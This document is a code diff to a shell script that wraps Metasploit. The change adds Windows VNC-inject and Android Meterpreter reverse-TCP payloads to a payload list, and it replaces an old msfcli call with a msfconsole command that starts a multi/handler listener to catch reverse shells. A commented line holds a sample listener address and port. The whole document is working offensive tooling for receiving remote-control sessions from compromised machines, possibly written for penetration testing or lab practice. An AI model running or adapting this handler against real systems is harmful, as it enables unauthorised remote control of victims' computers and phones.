@@ -32,6 +32,9 @@ PAYL[10]="java/meterpreter/reverse_tcp"
 PAYL[11]="cmd/unix/reverse_bash"
 PAYL[12]="cmd/unix/reverse_netcat"
 PAYL[13]="php/reverse_php"
+PAYL[14]="windows/vncinject/reverse_tcp"
+PAYL[15]="android/meterpreter/reverse_tcp"
+
 
 THEPAYLOAD=""
 
@@ -61,7 +64,14 @@ else
 fi
 
 
-echo "Running with....  msfcli exploit/multi/handler PAYLOAD=$THEPAYLOAD LHOST=$IP LPORT=$port E"
-echo "      starting the meterpreter listener.."
+#echo "Running with....  msfcli exploit/multi/handler PAYLOAD=$THEPAYLOAD LHOST=$IP LPORT=$port E"
+#echo "      starting the meterpreter listener.."
+# msfconsole -x "use android/meterpreter/reverse_tcp;set LHOST 192.168.1.66;set LPORT 6666;exploit"
+msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LHOST $IP;set LPORT $port;exploit"
+#msfcli exploit/multi/handler PAYLOAD=$THEPAYLOAD LHOST=$IP LPORT=$port E
 
-msfcli exploit/multi/handler PAYLOAD=$THEPAYLOAD LHOST=$IP LPORT=$port E
+
+
+
+
+
